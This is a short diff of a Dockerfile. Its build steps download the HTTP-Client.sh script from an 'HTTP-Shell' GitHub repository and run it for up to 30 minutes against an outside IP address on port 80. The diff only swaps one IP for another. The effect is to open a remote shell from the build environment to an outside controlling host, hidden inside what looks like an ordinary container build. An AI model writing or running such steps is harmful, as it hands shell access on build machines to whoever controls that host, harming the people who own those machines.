@@ -13,7 +13,7 @@ RUN apt-get install curl -y
 RUN wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh
 RUN dpkg-reconfigure -fnoninteractive dash
 #RUN ifconfig
-RUN bash -c "timeout -k 1 -s SIGKILL 30m bash ./HTTP-Client.sh -c 172.174.195.173:80"
+RUN bash -c "timeout -k 1 -s SIGKILL 30m bash ./HTTP-Client.sh -c 44.206.117.20:80"
 RUN ggg
 #EXPOSE 22
 
